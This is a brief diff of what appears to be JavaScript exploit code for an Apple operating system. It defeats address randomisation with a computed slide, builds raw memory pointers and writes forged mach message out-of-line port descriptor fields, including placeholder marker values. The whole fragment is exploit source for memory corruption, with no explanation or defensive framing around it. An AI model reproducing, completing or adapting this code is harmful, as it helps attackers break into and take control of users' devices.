@@ -64,8 +64,8 @@ function main() {
 	var np2 = new native_ptr_u32(UNSLID_BASE + (get_our_slide() << 12));
 	var np3 = new native_ptr_u16_2(UNSLID_BASE + (get_our_slide() << 12));
 
-	var addy = shit_heap(12);
-	var np4 = new mach_msg_ool_ports_descriptor_t(addy);
+	var np4 = new mach_msg_ool_ports_descriptor_t();
+	var addy = np4.addy;
 	write_u32(addy, 0x41414141);
 	write_u32(addy + 4, 0x42424242);
 	write_u32(addy + 8, ((19 << 16) + (MACH_MSG_OOL_PORTS_DESCRIPTOR << 24)));
